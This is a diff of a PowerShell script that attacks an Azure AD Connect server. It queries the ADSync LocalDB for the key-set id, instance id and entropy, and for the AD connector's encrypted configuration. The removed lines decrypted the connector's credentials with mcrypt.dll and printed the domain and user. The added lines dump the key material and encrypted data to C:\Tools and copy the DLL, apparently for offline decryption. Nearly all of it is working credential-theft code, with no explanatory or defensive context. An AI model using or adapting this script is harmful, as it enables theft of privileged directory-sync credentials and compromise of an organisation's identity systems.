@@ -12,48 +12,29 @@ az rest --method GET --uri 'https://graph.windows.net/7FA7586B-5364-4213-A53A-C9
 
 
 
-
 $client = New-Object System.Data.SqlClient.SqlConnection
 $client.ConnectionString = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
 $client.Open()
-
 $cmd = $client.CreateCommand()
 $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
 $reader = $cmd.ExecuteReader()
 $reader.Read()
-$key_id = $reader.GetInt32(0)
-$instance_id = $reader.GetGuid(1)
-$entropy = $reader.GetGuid(2)
+$reader.GetInt32(0).ToString() | Out-File C:\Tools\ks.txt
+$reader.GetGuid(1).ToString() | Out-File C:\Tools\ii.txt
+$reader.GetGuid(2).ToString() | Out-File C:\Tools\en.txt
 $reader.Close()
-
 $cmd2 = $client.CreateCommand()
 $cmd2.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
-$reader2 = $cmd2.ExecuteReader()
-$reader2.Read()
-$config = $reader2.GetString(0)
-$crypted = $reader2.GetString(1)
-$reader2.Close()
+$r2 = $cmd2.ExecuteReader()
+$r2.Read()
+$r2.GetString(0) | Out-File C:\Tools\config.xml
+$r2.GetString(1) | Out-File C:\Tools\crypted.txt
+$r2.Close()
 $client.Close()
 
-Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
-$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
-$km.LoadKeySet([System.Xml.Linq.XElement]::Parse($crypted), $key_id, $instance_id)
-$key = $null
-$km.GetActiveCredentialKey([ref]$key)
-$key2 = $null
-$key.ExportClearTextKey([ref]$key2)
-$decrypted = $null
-$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
 
-Write-Host "`nDecrypted configuration:"
-Write-Host $decrypted
+Copy-Item "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll" C:\Tools\
 
-# Parse out the username and password
-[xml]$xml = $config
-$domain = $xml.SelectSingleNode("//parameter[@name='forest-login-domain']").'#text'
-$user = $xml.SelectSingleNode("//parameter[@name='forest-login-user']").'#text'
-Write-Host "`nDomain: $domain"
-Write-Host "User: $user"
 
 
 
